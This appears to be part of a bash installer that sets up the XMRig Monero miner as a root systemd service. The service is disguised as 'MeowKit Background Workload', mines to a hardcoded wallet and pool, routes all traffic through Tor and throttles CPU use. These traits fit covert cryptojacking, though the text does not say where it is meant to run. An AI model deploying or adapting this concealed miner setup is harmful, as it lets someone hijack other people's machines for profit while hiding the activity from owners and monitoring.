#!/usr/bin/env bash
WALLET='47WAy3LX7uLU8Drp7LNDonBocgSq6MEpM97VwKaRqhiy1Co9PeQ63HdC2ecuhdhqSsYjrwbaZctFuMGfWgVcq6zGMGYg8oG'
POOL='gulf.moneroocean.stream:10001'
XMRIG_VERSION='6.26.0'

worker_name() {
  local idfile="$MEOWKIT_DIR/worker-id" id=1
  install -d -m 750 "$MEOWKIT_DIR"
  if [[ -f $idfile ]] && grep -Eq '^[0-9]+$' "$idfile"; then id=$(<"$idfile"); else printf '%s\n' "$id" > "$idfile"; chmod 600 "$idfile"; fi
  RIG_NAME="meow$id"
}

install_xmrig() {
  begin_step 'XMRig installation check'
  if [[ ${REPAIR:-0} == 1 && -x $MEOWKIT_BIN ]] && "$MEOWKIT_BIN" --version 2>&1 | grep -Fq "$XMRIG_VERSION"; then
    log "Existing XMRig $XMRIG_VERSION binary is valid; preserving it."
    return 0
  fi
  begin_step 'XMRig download and verification'
  make_workdir
  local api="$WORKDIR/release.json" asset="$WORKDIR/xmrig.tar.gz" digest url
  curl_tor --output "$api" "https://api.github.com/repos/xmrig/xmrig/releases/tags/v${XMRIG_VERSION}" || fail 'Could not retrieve XMRig release metadata through Tor.'
  read -r digest url < <(python3 - "$api" <<'PY'
import json,sys
obj=json.load(open(sys.argv[1]))
for a in obj.get('assets',[]):
    if a.get('name') == 'xmrig-6.26.0-linux-static-x64.tar.gz':
        print((a.get('digest') or '').removeprefix('sha256:'), a.get('browser_download_url',''))
        break
PY
)
  [[ ${digest:-} =~ ^[a-fA-F0-9]{64}$ && ${url:-} == https://github.com/xmrig/* ]] || fail 'Official XMRig release did not provide a usable SHA-256 digest and download URL.'
  curl_tor --output "$asset" "$url" || fail 'XMRig download failed through Tor.'
  printf '%s  %s\n' "$digest" "$asset" | sha256sum --check --status || fail 'XMRig SHA-256 verification failed.'
  tar -xzf "$asset" -C "$WORKDIR" || fail 'Could not unpack XMRig archive.'
  local extracted="$WORKDIR/xmrig-${XMRIG_VERSION}/xmrig"
  [[ -x $extracted ]] || fail 'Expected XMRig executable was not found in the release archive.'
  install -m 0755 "$extracted" "$MEOWKIT_BIN"
}

write_tor_check() {
  cat > /usr/local/sbin/meowkit-tor-check <<'EOFCHK'
#!/bin/sh
set -eu
response=$(/usr/bin/curl --connect-timeout 8 --max-time 15 --silent --fail --socks5-hostname 127.0.0.1:9050 https://check.torproject.org/api/ip)
printf '%s' "$response" | /usr/bin/python3 -c 'import json,sys; d=json.load(sys.stdin); sys.exit(0 if d.get("IsTor") is True else 1)'
EOFCHK
  chmod 755 /usr/local/sbin/meowkit-tor-check
}

write_configuration() {
  begin_step 'Validated miner configuration'
  [[ ! -e $MEOWKIT_DIR || -d $MEOWKIT_DIR ]] || fail "$MEOWKIT_DIR exists but is not a directory. Move or remove that conflicting path, then rerun."
  install -d -m 750 "$MEOWKIT_DIR"
  [[ ! -e $MEOWKIT_DIR/config.json || -f $MEOWKIT_DIR/config.json ]] || fail "$MEOWKIT_DIR/config.json exists but is not a regular file. Move or remove the conflicting directory, then rerun."
  worker_name
  local tmp="$MEOWKIT_DIR/config.json.tmp.$$"
  cat > "$tmp" <<EOFJSON
{
  "autosave": false,
  "background": false,
  "colors": false,
  "title": false,
  "randomx": { "init": -1, "mode": "auto", "1gb-pages": true, "rdmsr": true, "wrmsr": true, "numa": true },
  "cpu": { "enabled": true, "huge-pages": true, "huge-pages-jit": true, "priority": 1, "yield": true, "asm": true },
  "opencl": { "enabled": false },
  "cuda": { "enabled": false },
  "pools": [
    { "algo": null, "coin": null, "url": "${POOL}", "user": "${WALLET}", "pass": "${RIG_NAME}", "rig-id": "${RIG_NAME}", "keepalive": true, "tls": false, "daemon": false, "socks5": "127.0.0.1:9050" }
  ]
}
EOFJSON
  python3 -m json.tool "$tmp" >/dev/null || { rm -f "$tmp"; fail 'Generated config.json is invalid JSON; refusing to install it.'; }
  chmod 640 "$tmp"
  chown root:root "$tmp"
  mv -f "$tmp" "$MEOWKIT_DIR/config.json"
  write_tor_check
  HP_WRITE_PATHS='/sys/kernel/mm/hugepages/hugepages-2048kB'
  [[ -d /sys/kernel/mm/hugepages/hugepages-1048576kB ]] && HP_WRITE_PATHS+='/sys/kernel/mm/hugepages/hugepages-1048576kB'

  cat > "$MEOWKIT_SERVICE" <<EOFUNIT
[Unit]
Description=MeowKit Background Workload
Wants=network-online.target ${TOR_UNIT}
After=network-online.target
StartLimitIntervalSec=0

[Service]
Type=simple
ExecStartPre=/usr/local/sbin/meowkit-hugepages
ExecStart=${MEOWKIT_BIN} --config=${MEOWKIT_DIR}/config.json --threads=${THREADS}
Restart=always
RestartSec=30
Nice=10
CPUWeight=20
CPUQuota=${CPU_QUOTA}%
NoNewPrivileges=true
PrivateTmp=true
ProtectSystem=strict
ProtectHome=true
ReadWritePaths=${MEOWKIT_DIR} ${HP_WRITE_PATHS}
StandardOutput=journal
StandardError=journal
SyslogIdentifier=meowkit

[Install]
WantedBy=multi-user.target
EOFUNIT
  chmod 644 "$MEOWKIT_SERVICE"
  systemd-analyze verify "$MEOWKIT_SERVICE" || fail 'systemd rejected the generated service unit.'
  systemctl daemon-reload || fail 'systemd could not reload unit files.'
  systemctl enable meowkit.service >/dev/null 2>&1 || fail 'Could not enable meowkit.service at boot.'
  systemctl restart meowkit.service || info 'Service restart did not complete immediately; inspect journalctl -u meowkit.service.'
}

run_install() {
  CURRENT_STEP=preflight
  require_cmd systemctl
  require_cmd apt-get
  require_cmd python3
  detect_resources
  bootstrap_tor
  configure_msr
  configure_hugepages
  install_xmrig
  write_configuration
  info "Installed meowkit.service; worker ${RIG_NAME}; ${THREADS}/${TOTAL_THREADS} available CPU threads; CPUQuota=${CPU_QUOTA}%."
  info 'Tor is a runtime dependency only: a slow Tor bootstrap will not block VM boot.'
}
